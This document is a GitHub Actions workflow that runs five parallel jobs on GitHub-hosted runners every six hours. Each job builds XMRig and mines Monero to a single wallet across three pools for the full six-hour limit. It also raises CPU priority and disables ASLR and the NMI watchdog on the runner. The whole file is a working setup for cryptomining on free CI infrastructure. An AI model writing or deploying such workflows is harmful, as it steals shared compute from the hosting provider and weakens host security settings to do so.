name: XMR Mining Optimized

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  mine-1:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      - name: System Optimization
        run: |
          sudo sysctl -w vm.nr_hugepages=1280
          sudo sysctl -w kernel.randomize_va_space=0
          sudo sysctl -w vm.swappiness=1
          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
          
      - name: Install Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
          
      - name: Build XMRig
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          mkdir build && cd build
          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
          make -j$(nproc)
          
      - name: Configure Mining
        run: |
          cd xmrig/build
          cat > config.json <<EOF
          {
            "autosave": true,
            "cpu": {
              "enabled": true,
              "huge-pages": true,
              "huge-pages-jit": true,
              "hw-aes": true,
              "priority": 5,
              "memory-pool": true,
              "max-threads-hint": 100,
              "asm": "auto",
              "argon2-impl": "auto"
            },
            "pools": [
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.supportxmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner1",
                "rig-id": "gh-r1",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.minexmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner1",
                "rig-id": "gh-r1",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr-eu1.nanopool.org:14433",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner1",
                "rig-id": "gh-r1",
                "keepalive": true,
                "tls": true
              }
            ],
            "retries": 10,
            "retry-pause": 5,
            "donate-level": 1,
            "print-time": 60
          }
          EOF
          
      - name: CPU Performance Mode
        run: |
          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          
      - name: Start Mining
        run: |
          cd xmrig/build
          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
          
      - name: Cleanup
        if: always()
        run: |
          sudo pkill -9 xmrig || true
          rm -rf xmrig

  mine-2:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      - name: System Optimization
        run: |
          sudo sysctl -w vm.nr_hugepages=1280
          sudo sysctl -w kernel.randomize_va_space=0
          sudo sysctl -w vm.swappiness=1
          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
          
      - name: Install Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
          
      - name: Build XMRig
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          mkdir build && cd build
          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
          make -j$(nproc)
          
      - name: Configure Mining
        run: |
          cd xmrig/build
          cat > config.json <<EOF
          {
            "autosave": true,
            "cpu": {
              "enabled": true,
              "huge-pages": true,
              "huge-pages-jit": true,
              "hw-aes": true,
              "priority": 5,
              "memory-pool": true,
              "max-threads-hint": 100,
              "asm": "auto",
              "argon2-impl": "auto"
            },
            "pools": [
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.supportxmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner2",
                "rig-id": "gh-r2",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.minexmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner2",
                "rig-id": "gh-r2",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr-eu1.nanopool.org:14433",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner2",
                "rig-id": "gh-r2",
                "keepalive": true,
                "tls": true
              }
            ],
            "retries": 10,
            "retry-pause": 5,
            "donate-level": 1,
            "print-time": 60
          }
          EOF
          
      - name: CPU Performance Mode
        run: |
          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          
      - name: Start Mining
        run: |
          cd xmrig/build
          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
          
      - name: Cleanup
        if: always()
        run: |
          sudo pkill -9 xmrig || true
          rm -rf xmrig

  mine-3:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      - name: System Optimization
        run: |
          sudo sysctl -w vm.nr_hugepages=1280
          sudo sysctl -w kernel.randomize_va_space=0
          sudo sysctl -w vm.swappiness=1
          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
          
      - name: Install Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
          
      - name: Build XMRig
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          mkdir build && cd build
          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
          make -j$(nproc)
          
      - name: Configure Mining
        run: |
          cd xmrig/build
          cat > config.json <<EOF
          {
            "autosave": true,
            "cpu": {
              "enabled": true,
              "huge-pages": true,
              "huge-pages-jit": true,
              "hw-aes": true,
              "priority": 5,
              "memory-pool": true,
              "max-threads-hint": 100,
              "asm": "auto",
              "argon2-impl": "auto"
            },
            "pools": [
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.supportxmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner3",
                "rig-id": "gh-r3",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.minexmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner3",
                "rig-id": "gh-r3",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr-eu1.nanopool.org:14433",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner3",
                "rig-id": "gh-r3",
                "keepalive": true,
                "tls": true
              }
            ],
            "retries": 10,
            "retry-pause": 5,
            "donate-level": 1,
            "print-time": 60
          }
          EOF
          
      - name: CPU Performance Mode
        run: |
          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          
      - name: Start Mining
        run: |
          cd xmrig/build
          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
          
      - name: Cleanup
        if: always()
        run: |
          sudo pkill -9 xmrig || true
          rm -rf xmrig

  mine-4:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      - name: System Optimization
        run: |
          sudo sysctl -w vm.nr_hugepages=1280
          sudo sysctl -w kernel.randomize_va_space=0
          sudo sysctl -w vm.swappiness=1
          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
          
      - name: Install Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
          
      - name: Build XMRig
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          mkdir build && cd build
          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
          make -j$(nproc)
          
      - name: Configure Mining
        run: |
          cd xmrig/build
          cat > config.json <<EOF
          {
            "autosave": true,
            "cpu": {
              "enabled": true,
              "huge-pages": true,
              "huge-pages-jit": true,
              "hw-aes": true,
              "priority": 5,
              "memory-pool": true,
              "max-threads-hint": 100,
              "asm": "auto",
              "argon2-impl": "auto"
            },
            "pools": [
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.supportxmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner4",
                "rig-id": "gh-r4",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.minexmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner4",
                "rig-id": "gh-r4",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr-eu1.nanopool.org:14433",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner4",
                "rig-id": "gh-r4",
                "keepalive": true,
                "tls": true
              }
            ],
            "retries": 10,
            "retry-pause": 5,
            "donate-level": 1,
            "print-time": 60
          }
          EOF
          
      - name: CPU Performance Mode
        run: |
          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          
      - name: Start Mining
        run: |
          cd xmrig/build
          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
          
      - name: Cleanup
        if: always()
        run: |
          sudo pkill -9 xmrig || true
          rm -rf xmrig

  mine-5:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      - name: System Optimization
        run: |
          sudo sysctl -w vm.nr_hugepages=1280
          sudo sysctl -w kernel.randomize_va_space=0
          sudo sysctl -w vm.swappiness=1
          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
          
      - name: Install Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
          
      - name: Build XMRig
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          mkdir build && cd build
          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
          make -j$(nproc)
          
      - name: Configure Mining
        run: |
          cd xmrig/build
          cat > config.json <<EOF
          {
            "autosave": true,
            "cpu": {
              "enabled": true,
              "huge-pages": true,
              "huge-pages-jit": true,
              "hw-aes": true,
              "priority": 5,
              "memory-pool": true,
              "max-threads-hint": 100,
              "asm": "auto",
              "argon2-impl": "auto"
            },
            "pools": [
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.supportxmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner5",
                "rig-id": "gh-r5",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.minexmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner5",
                "rig-id": "gh-r5",
                "keepalive": true,
                "tls": true
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr-eu1.nanopool.org:14433",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "runner5",
                "rig-id": "gh-r5",
                "keepalive": true,
                "tls": true
              }
            ],
            "retries": 10,
            "retry-pause": 5,
            "donate-level": 1,
            "print-time": 60
          }
          EOF
          
      - name: CPU Performance Mode
        run: |
          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          
      - name: Start Mining
        run: |
          cd xmrig/build
          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
          
      - name: Cleanup
        if: always()
        run: |
          sudo pkill -9 xmrig || true
          rm -rf xmrig
